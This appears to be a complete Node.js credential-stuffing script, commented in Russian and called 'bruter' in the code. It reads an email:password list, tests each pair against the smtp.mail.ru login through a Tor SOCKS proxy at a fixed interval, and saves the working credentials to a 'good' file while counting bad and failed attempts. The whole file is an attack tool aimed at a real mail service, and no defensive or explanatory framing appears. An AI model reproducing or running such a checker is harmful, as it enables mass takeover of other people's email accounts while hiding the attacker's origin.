var FILE_SOURCE = 'var/base-gen.txt';
var FILE_GOODS = 'var/brute/good.txt';

var INTERVAL = 20;

/* Символ соединения базы email:pass
   По умолчанию: ":" */
var STRING_SEPARATOR = ':';

var EMAIL_PASSWORD = [];
var COUNT_GOODS = 0;
var COUNT_BADS = 0;
var COUNT_ERRORS = 0;

const fs = require('fs');
const path = require('path');
const colors = require('colors');
const nodemailer = require("nodemailer");

var BASE = fs.readFileSync(FILE_SOURCE, 'utf8').trim().split('\r\n');

BASE = Array.from(new Set(BASE));
BASE = BASE.filter(Boolean);

let date_ob = new Date();
let date = ("0" + date_ob.getDate()).slice(-2);
let month = ("0" + (date_ob.getMonth() + 1)).slice(-2);
let year = date_ob.getFullYear();
let hours = date_ob.getHours();
let minutes = date_ob.getMinutes();
let seconds = date_ob.getSeconds();
let stamp = date + '-' + month + '_' + hours + '-' + minutes + '-' + seconds;

if (fs.existsSync(FILE_GOODS)) {
    fs.renameSync(FILE_GOODS, 'var/archive/' + path.basename(FILE_GOODS.replace('.txt', '') + '_' + stamp + '.txt'));
}

fs.writeFileSync(FILE_GOODS, '');

console.log("Загружено строк: ".blue + BASE.length);

var i = 0;

const bruter = setInterval(function() {

    if (BASE.length <= i) {
        console.log('Готово, ожидание завершения всех попыток входа.'.blue);
        clearInterval(bruter);
    }

    if (BASE[i] == undefined) {
        return;
    }

    EMAIL_PASSWORD = BASE[i].split(STRING_SEPARATOR); // [0] - email, [1] - password

    let transporter = nodemailer.createTransport({
        host: "smtp.mail.ru",
        port: 465,
        secure: true,
        proxy: 'socks5://127.0.0.1:9050',
        auth: {
            user: EMAIL_PASSWORD[0],
            pass: EMAIL_PASSWORD[1]
        }
    });

    transporter.set('proxy_socks_module', require('socks'));

    (function(EMAIL_PASSWORD, i) {
        transporter.verify(async function(error, success) {
            if (error) {
                if (error.responseCode !== 535) {
                    COUNT_ERRORS++;
                    console.log(colors.brightRed(error));
                    return;
                }
                COUNT_BADS++;
                console.log('[' + i + '/' + BASE.length + '] [' + COUNT_GOODS + '/' + COUNT_BADS + '/' + COUNT_ERRORS + '] Bad: ' + EMAIL_PASSWORD[0] + ':' + EMAIL_PASSWORD[1]);
            } else {
                COUNT_GOODS++;
                fs.appendFileSync(FILE_GOODS, EMAIL_PASSWORD[0] + ':' + EMAIL_PASSWORD[1] + '\r\n');
                console.log(colors.green('[' + i + '/' + BASE.length + '] [' + COUNT_GOODS + '/' + COUNT_BADS + '/' + COUNT_ERRORS + '] Good: ' + EMAIL_PASSWORD[0] + ':' + EMAIL_PASSWORD[1]));
            }
        });
    })(EMAIL_PASSWORD, i);

    transporter.close();

    i++
}, INTERVAL);
